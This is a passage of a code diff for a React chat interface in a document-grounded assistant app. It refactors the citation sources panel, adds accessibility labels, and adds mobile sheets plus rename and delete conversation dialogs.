+                  <p id="chat-input-hint" className="hidden sm:block mt-1.5 text-[11px] text-slate-500 text-center">
+                    Enter to send · Shift+Enter for a new line
+                  </p>
                 </div>
-              </div>
-              <input type="file" ref={fileInputRef} onChange={handleFileUpload} className="hidden" accept=".pdf,.txt,.docx,.csv,.xlsx" multiple />
+              </form>
             </section>
 
-            {/* ── Source Panel (resizable / collapsible to icon rail) ── */}
-            {showSourcePanel ? (
-              <aside id="source-panel" style={{ width: sourceWidth }} className="relative shrink-0 border-l border-slate-200 bg-white hidden md:flex flex-col h-full">
-                <div onMouseDown={startResize('source')} className="absolute top-0 -left-1 w-2 h-full cursor-col-resize z-10 group">
-                  <div className="mx-auto w-[2px] h-full bg-transparent group-hover:bg-indigo-400 transition-colors" />
+            {/* ── Sources (desktop) ── */}
+            {panels.sourceOpen ? (
+              <aside aria-label="Sources" style={{ width: panels.sourceWidth }} className="relative shrink-0 border-l border-slate-200 bg-white hidden md:flex flex-col min-h-0">
+                <div onMouseDown={e => startResize(e, 'source')} className="absolute top-0 -left-1 w-2 h-full cursor-col-resize z-10 group" aria-hidden="true">
+                  <div className="mx-auto w-0.5 h-full bg-transparent group-hover:bg-indigo-400 transition-colors" />
                 </div>
-                <div className="h-12 px-4 border-b border-slate-200 flex items-center justify-between shrink-0 bg-slate-50/50">
-                  <div className="flex items-center gap-2 truncate">
-                    <BookOpen className="w-4 h-4 text-indigo-600 shrink-0" />
-                    <span className="text-xs font-semibold text-slate-900 tracking-tight truncate font-headline">
-                      {activeSource ? activeSource.citations[activeSource.focusIdx]?.filename : 'Source Inspector'}
-                    </span>
-                  </div>
-                  <div className="flex items-center gap-2">
-                    {activeSource && (
+                <div className="h-12 px-4 border-b border-slate-200 flex items-center justify-between gap-2 shrink-0 bg-slate-50/50">
+                  <h2 className="flex items-center gap-2 min-w-0 text-xs font-semibold text-slate-900 tracking-tight font-headline">
+                    <BookOpen className="w-4 h-4 text-indigo-600 shrink-0" aria-hidden="true" />
+                    <span className="truncate">{sourceTitle}</span>
+                  </h2>
+                  <div className="flex items-center gap-2 shrink-0">
+                    {activeSource && activeSource.citations.length > 1 && (
                       <span className="text-[11px] font-mono text-slate-600 px-2 py-0.5 rounded bg-white border border-slate-200">
                         {activeSource.focusIdx + 1} / {activeSource.citations.length}
                       </span>
                     )}
-                    <button onClick={() => setShowSourcePanel(false)} className="p-1 rounded text-slate-400 hover:text-slate-700 hover:bg-slate-100 transition-colors" title="Collapse">
-                      <PanelRightClose size={15} />
+                    <button type="button" onClick={toggleSources} className="p-1 rounded text-slate-500 hover:text-slate-700 hover:bg-slate-100 transition-colors" aria-label="Hide sources">
+                      <PanelRightClose size={15} aria-hidden="true" />
                     </button>
                   </div>
                 </div>
-
-                <div className="flex-1 overflow-y-auto p-5 font-mono text-xs leading-relaxed space-y-4 select-text text-slate-600">
-                  {!activeSource && (
-                    <div className="text-center text-slate-400 font-sans text-sm pt-16 space-y-2">
-                      <BookOpen className="w-8 h-8 mx-auto opacity-40" />
-                      <p>Click a citation in an answer to inspect the source passage.</p>
-                    </div>
-                  )}
-                  {activeSource?.citations.map((c, i) => {
-                    const focused = i === activeSource.focusIdx;
-                    return (
-                      <div key={i} id={`cite-${i}`} onClick={() => setActiveSource({ ...activeSource, focusIdx: i })}
-                        className={`p-3.5 rounded-lg border cursor-pointer transition-all ${focused ? 'border-indigo-200 bg-indigo-50/50 ring-1 ring-indigo-200/50' : 'border-slate-200 bg-slate-50/70 opacity-60 hover:opacity-100'}`}>
-                        <div className="flex items-center justify-between mb-1.5 gap-2 font-sans">
-                          <span className={`font-semibold text-[11px] truncate ${focused ? 'text-indigo-700' : 'text-slate-700'}`}>
-                            [{c.evidence_id || `E${i + 1}`}] {c.section_title || c.filename}{c.page_start ? ` · p.${c.page_start}` : ''}
-                          </span>
-                          {focused && <span className="text-[9px] text-indigo-700 uppercase font-bold tracking-wider px-1.5 py-0.5 rounded bg-indigo-100 border border-indigo-200 shrink-0">Active Citation</span>}
-                        </div>
-                        <p className="text-slate-900 leading-normal whitespace-pre-wrap">{c.content}</p>
-                        {c.rerank_score != null && (
-                          <div className="mt-2 text-[10px] text-slate-400">relevance {c.rerank_score.toFixed(3)}</div>
-                        )}
-                      </div>
-                    );
-                  })}
-                </div>
-
-                <div className="p-3 border-t border-slate-200 bg-slate-50/50 text-[11px] text-slate-500 flex items-center gap-1.5">
-                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-500" />
-                  {activeSource ? `${activeSource.citations.length} grounded passage(s)` : 'No source selected'}
-                </div>
+                <div className="flex-1 overflow-y-auto p-5">{renderSources('panel')}</div>
               </aside>
             ) : (
-              <aside className="w-12 shrink-0 border-l border-slate-200 bg-slate-50/50 hidden md:flex flex-col items-center py-3 gap-2">
-                <button onClick={() => setShowSourcePanel(true)} className="relative p-2 rounded-lg text-slate-500 hover:text-indigo-600 hover:bg-white border border-transparent hover:border-slate-200 transition-colors" title="Show Source Panel">
-                  <BookOpen size={18} />
-                  {activeSource && <span className="absolute top-1 right-1 w-1.5 h-1.5 rounded-full bg-indigo-600" />}
+              <div className="w-12 shrink-0 border-l border-slate-200 bg-slate-50/50 hidden md:flex flex-col items-center py-3 gap-2">
+                <button type="button" onClick={toggleSources} className="relative p-2 rounded-lg text-slate-500 hover:text-indigo-600 hover:bg-white border border-transparent hover:border-slate-200 transition-colors" aria-label="Show sources">
+                  <BookOpen size={18} aria-hidden="true" />
+                  {activeSource && <span className="absolute top-1 right-1 w-1.5 h-1.5 rounded-full bg-indigo-600" aria-hidden="true" />}
                 </button>
-              </aside>
+              </div>
             )}
-          </main>
+          </div>
         </div>
       )}
+
+      {/* ── Mobile sheets ── */}
+      <Dialog open={mobilePanel === 'history'} onClose={() => setMobilePanel(null)} title="Conversations" size="lg">
+        <button type="button" onClick={startNewChat} className={`${buttonStyles.secondary} w-full mb-3`}>
+          <Plus size={14} className="text-indigo-600" aria-hidden="true" /> New conversation
+        </button>
+        {renderHistoryList()}
+      </Dialog>
+      <Dialog open={mobilePanel === 'sources'} onClose={() => setMobilePanel(null)} title={sourceTitle} size="lg">
+        {renderSources('sheet')}
+      </Dialog>
+
+      {/* ── Conversation dialogs ── */}
+      <Dialog
+        open={renameTarget !== null}
+        onClose={() => setRenameTarget(null)}
+        title="Rename conversation"
+        size="sm"
+        dismissible={!renaming}
+        footer={
+          <>
+            <button type="button" onClick={() => setRenameTarget(null)} disabled={renaming} className={buttonStyles.secondary}>Cancel</button>
+            <button type="submit" form="rename-chat-form" disabled={renaming || !renameValue.trim()} className={buttonStyles.primary}>
+              {renaming && <Loader2 size={16} className="animate-spin" aria-hidden="true" />}
+              Save
+            </button>
+          </>
+        }
+      >
+        <form id="rename-chat-form" onSubmit={submitRename} className="space-y-2">
+          <label htmlFor="rename-chat-input" className="text-sm font-semibold text-slate-900 block">Name</label>
+          <input
+            id="rename-chat-input"
+            value={renameValue}
+            onChange={e => { setRenameValue(e.target.value); setRenameError(null); }}
+            maxLength={100}
+            className="w-full bg-white border border-slate-300 rounded-lg px-3.5 py-2.5 text-sm text-slate-900 focus:outline-none focus:border-indigo-600 focus:ring-2 focus:ring-indigo-600/15"
+            aria-invalid={renameError ? true : undefined}
+            aria-describedby={renameError ? 'rename-chat-error' : undefined}
+          />
+          {renameError && <p id="rename-chat-error" role="alert" className="text-sm text-red-700">{renameError}</p>}
+        </form>
+      </Dialog>
+
+      <ConfirmDialog
+        open={deleteTarget !== null}
+        title="Delete conversation?"
+        description={<>“{deleteTarget?.title}” will be permanently deleted. Your documents are not affected.</>}
+        confirmLabel="Delete conversation"
+        destructive
+        onConfirm={confirmDeleteChat}
+        onClose={() => setDeleteTarget(null)}
+      />
     </div>
   );
 }
